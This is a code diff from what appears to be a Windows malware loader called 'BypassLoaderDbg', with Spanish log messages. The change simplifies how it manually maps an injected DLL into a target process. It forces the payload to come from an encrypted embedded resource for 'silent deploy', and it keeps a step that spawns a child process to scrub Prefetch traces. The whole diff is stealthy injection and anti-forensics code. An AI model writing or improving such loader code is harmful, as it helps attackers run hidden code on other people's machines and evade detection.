@@ -454,7 +454,7 @@ static bool ParseLogFlag(const wchar_t* cmdline) {
 
 // ── Core injection flow (shared by both variants) ────────────────────────────
 // Returns 0 on success, non-zero on failure.
-static int RunInject(std::vector<uint8_t>& dll_bytes, bool use_txf, bool use_ram) {
+static int RunInject(std::vector<uint8_t>& dll_bytes) {
     // P3-06: validate PE
     std::wstring pe_err;
     if (!ValidatePayloadPE(dll_bytes.data(), dll_bytes.size(), pe_err)) {
@@ -506,18 +506,8 @@ static int RunInject(std::vector<uint8_t>& dll_bytes, bool use_txf, bool use_ram
     }
 
     std::wstring status;
-    bool ok = false;
-
-    if (use_txf) {
-        LOG(L"[*] ManualMap TxF...\n");
-        ok = bp::ManualMapViaTxf(hProc, dll_bytes.data(), dll_bytes.size(), status);
-    } else if (use_ram) {
-        LOG(L"[*] ManualMap RAM...\n");
-        ok = bp::ManualMapInMemory(hProc, dll_bytes.data(), dll_bytes.size(), status);
-    } else {
-        LOG(L"[*] ManualMap SEC_IMAGE + POSIX delete...\n");
-        ok = bp::ManualMapFileBacked(hProc, dll_bytes.data(), dll_bytes.size(), status);
-    }
+    LOG(L"[*] ManualMap (SEC_IMAGE + POSIX delete)...\n");
+    bool ok = bp::ManualMapTarget(hProc, dll_bytes.data(), dll_bytes.size(), status);
 
     CloseHandle(hProc);
 
@@ -568,15 +558,10 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
         }
     }
 
-    // Fallback: load from disk if resource absent
-    if (dll_bytes.empty()) {
-        std::wstring p = ExeDir() + L"\\" + kDefaultPayload;
-        if (std::filesystem::exists(p))
-            dll_bytes = LoadFile(p);
-    }
+    // In silent deploy, payload must come from encrypted RCDATA resource
     if (dll_bytes.empty()) return 1;
 
-    int result = RunInject(dll_bytes, false, false);
+    int result = RunInject(dll_bytes);
 
     // T4: launch scrub child to handle Prefetch after our exit
     LaunchScrubChild(g_log_path);
@@ -610,13 +595,9 @@ int wmain(int argc, wchar_t** argv) {
     }
 
     std::wstring payload_path;
-    bool use_txf = false;
-    bool use_ram = false;
 
     for (int i = 1; i < argc; ++i) {
-        if      (_wcsicmp(argv[i], L"--txf") == 0) use_txf = true;
-        else if (_wcsicmp(argv[i], L"--ram") == 0) use_ram = true;
-        else if (_wcsicmp(argv[i], L"--log") == 0) { ++i; /* already handled */ }
+        if      (_wcsicmp(argv[i], L"--log") == 0)   { ++i; /* already handled */ }
         else if (_wcsicmp(argv[i], L"--scrub") == 0) { ++i; /* already handled */ }
         else payload_path = argv[i];
     }
@@ -648,14 +629,11 @@ int wmain(int argc, wchar_t** argv) {
 
     if (dll_bytes.empty()) {
         LOG(L"[!] Payload no encontrado: %s\n", payload_path.c_str());
-        LOG(L"    Uso: BypassLoaderDbg.exe [ruta_dll] [--txf] [--ram] [--log]\n");
+        LOG(L"    Uso: BypassLoaderDbg.exe [ruta_dll] [--log]\n");
         return 1;
     }
 
-    LOG(L"[*] Ruta de inyeccion: %s\n",
-        use_txf ? L"TxF (SEC_IMAGE)" : (use_ram ? L"RAM (ManualMap)" : L"SEC_IMAGE + POSIX delete"));
-
-    int result = RunInject(dll_bytes, use_txf, use_ram);
+    int result = RunInject(dll_bytes);
 
     // T4: launch scrub child to handle Prefetch after our exit
     LaunchScrubChild(g_log_path);
